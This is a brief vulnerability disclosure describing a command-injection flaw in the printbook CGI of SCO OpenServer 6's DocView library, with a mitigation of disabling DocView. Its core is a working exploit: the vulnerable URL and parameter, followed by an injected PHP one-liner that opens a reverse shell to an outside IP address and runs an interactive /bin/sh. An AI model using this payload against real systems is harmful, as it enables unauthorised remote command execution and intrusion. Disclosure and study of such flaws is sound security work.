
# SCO OpenServer 6 CGI Parameter Bypass RCE
###**Responsible Disclosure Was Attempted.**


It was discovered that the printbook functionality within the DocView CGI library was vulnerable to a pipe parameter bypass, allowing an attacker to execute arbitrary system commands.
For some reason this ancient attack technique is still present within some older operating systems.

Tested on SCO OpenServer 6, however the printbook.cgi is still present within newer versions of OpenServer so im'a guess that the issue is still present. OpenServer is a little weird, its a unix based OS but dont expect most of the usual shells/tools to work.

Theres no official patch on fixing this however if you disable the DocView function you should be good.

![RCE Against SCO-OpenServer6](https://i.imgur.com/pzCZS3M.png)

###Affected parameter and URL decoded payload:

 - /cgi-bin/printbook?booktitle=216409&toclevels=1&part=%2fen%2fOSR_FEATS%2fCONTENTS.html&outputform=pdf[VULN]
 - || php -r '$sock=fsockopen("10.165.34.103",4242);exec("/bin/sh -i <&3 >&3 2>&3");' &


